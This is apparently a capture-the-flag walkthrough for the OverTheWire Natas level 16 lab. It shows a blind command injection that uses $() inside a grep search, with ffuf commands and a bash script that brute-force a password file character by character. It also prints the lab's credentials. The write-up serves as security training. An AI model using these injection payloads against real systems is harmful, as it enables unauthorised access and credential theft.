# Level 15 - Level 16

```
Username: natas16
Password: TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V
URL:      http://natas16.natas.labs.overthewire.org
```

## Overview

This time we got an input field with an link to the source code.&#x20;

<figure><img src="../.gitbook/assets/image (124).png" alt=""><figcaption></figcaption></figure>

***

## Source Code Analysis

On checking the source code, input keyword/string that we give is directly supplied as a parameter to the grep command, which looks out for matching strings in the `dictionary.txt` file and returns the output.

<figure><img src="../.gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>

This time the `$key` is enclosed with quotes which means whatever special characters or command we give will be considered as a string. And also this time all types of quotes are also blacklisted.

But still the above code is vulnerable to command injection, since we can use `$()` to execute shell commands. But we have to create a payload such that we extract data using the grep command, since the input is substituted in a grep command.

***

## Testing Command Injection

We can use grep and regexp and try to match data from `/etc/natas_webpass/natas17` and extract the password by brute-forcing. For that first we need a wordlist of alphanumeric characters ( since we know that the password only contains alphanumeric characters ), which can be generated using the following command.

```bash
echo {a..z} {A..Z} {0..9} | tr ' ' "\n" > alphanumeric.txt
```

Next for brute-forcing the input, I am using [ffuf](https://github.com/ffuf/ffuf), since its fast and optimized. But before we start brute-forcing, we need to find a way to filter the response, to check whether the data is matched or not.

To do that, first we have to find a unique word, that is present in the `dictionary.txt` from which the words are filtered by the application. To do so, I searched for words containing the letter `a`. It responded me with a list of words that contains the letter `a`, from which I chose the word `Americanisms`, as it is not repeated.

<figure><img src="../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

Now, whenever we try to grep the character from passwords file, for example we are giving the following input: `Americanisms$(grep ^b /etc/natas_webpass/natas)`, which will respond with the value `Americanisms`, since the password doesn't start with the character `b`.

Let's break down the payload: `Americanisms$(grep ^b /etc/natas_webpass/natas)`

We are using grep to lookout for words starting with `b`. If our password starts with the letter b, then the grep command will return the password prepended with the word `Americanisms` ( `Americanisms<grep_password>` ), but since our input is enclosed within quotes,&#x20;

<figure><img src="../.gitbook/assets/image (129).png" alt=""><figcaption></figcaption></figure>

the resulting command will be,

```bash
grep -i \"Americanisms$(grep ^b /etc/natas_webpass/natas)\" dictionary.txt
```

where the string `Americanisms<grep_password>` will be searched in the `dictionary.txt`, which returns nothing since there is no string word like `Americanisms<grep_password>` in the `dictionary.txt`.

But if the password doesn't start with the character `b`, then the resulting string will be `Americanisms`, since the result of the grep command will be null as the password doesn't start with the character `b`, the string `Americanisms` will be searched in the `dictionary.txt`,  which will return the word `Americanisms`.

<figure><img src="../.gitbook/assets/image (130).png" alt=""><figcaption></figcaption></figure>

Now we have a way to filter our response, i.e., if our response has the word `Americanisms`, then our password doesn't starts with the character we tried. If our response doesn't has the word `Americanisms`, then our password starts with the character we tried. Let's test this using ffuf:

```bash
ffuf -w alphanumeric.txt:FUZZ -u 'http://natas16.natas.labs.overthewire.org/?needle=Americanisms%24%28grep+%5EFUZZ+%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'    -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8' -H 'Authorization: Basic bmF0YXMxNjpUUkQ3aVpyZDVnQVRqajlQa1BFdWFPbGZFakhxajMyVg==' -H 'Proxy-Connection: keep-alive' -H 'Referer: http://natas16.natas.labs.overthewire.org/?needle=%24%28grep+-E+%5Ea+%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36' -fr "Americanisms"
```

<figure><img src="../.gitbook/assets/image (131).png" alt=""><figcaption></figcaption></figure>

The ffuf command successfully worked, and we have successfully found our first character of the password. To find the next character, we have to append the first character that we found to the payload this time: `Americanisms$(grep ^X /etc/natas_webpass/natas)`.

```bash
ffuf -w alphanumeric.txt:FUZZ -u 'http://natas16.natas.labs.overthewire.org/?needle=Americanisms%24%28grep+%5EXFUZZ+%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'    -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8' -H 'Authorization: Basic bmF0YXMxNjpUUkQ3aVpyZDVnQVRqajlQa1BFdWFPbGZFakhxajMyVg==' -H 'Proxy-Connection: keep-alive' -H 'Referer: http://natas16.natas.labs.overthewire.org/?needle=%24%28grep+-E+%5Ea+%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36' -fr "Americanisms"
```

<figure><img src="../.gitbook/assets/image (132).png" alt=""><figcaption></figcaption></figure>

Now we got our second character.

***

## Getting the Password

To get the third character we have to prepend `Xk` to the command. This process repeats unitil we find the entire password. So I have created a simple bash script to automate this process:

{% code lineNumbers="true" %}
```bash
#! /bin/bash

PASSWORD=""

for i in {1..32} # Since we know the length of the password is 32
do
    PASSWORD+=$(ffuf -w alphanumeric.txt:FUZZ -u "http://natas16.natas.labs.overthewire.org/?needle=Americanisms%24%28grep+%5E"$PASSWORD"FUZZ+%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search" -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'    -H 'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8' -H 'Authorization: Basic bmF0YXMxNjpUUkQ3aVpyZDVnQVRqajlQa1BFdWFPbGZFakhxajMyVg==' -H 'Proxy-Connection: keep-alive' -H 'Referer: http://natas16.natas.labs.overthewire.org/?needle=%24%28grep+-E+%5Ea+%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36' -fr "Americanisms" -v | grep "* FUZZ:" | cut -d ':' -f 2 | tr -d ' ')
done

echo Password = $PASSWORD
```
{% endcode %}

It's time to run the script:

<figure><img src="../.gitbook/assets/image (126).png" alt=""><figcaption></figcaption></figure>

And finally we got the password for the next level.

<figure><img src="../.gitbook/assets/image (125).png" alt=""><figcaption></figcaption></figure>
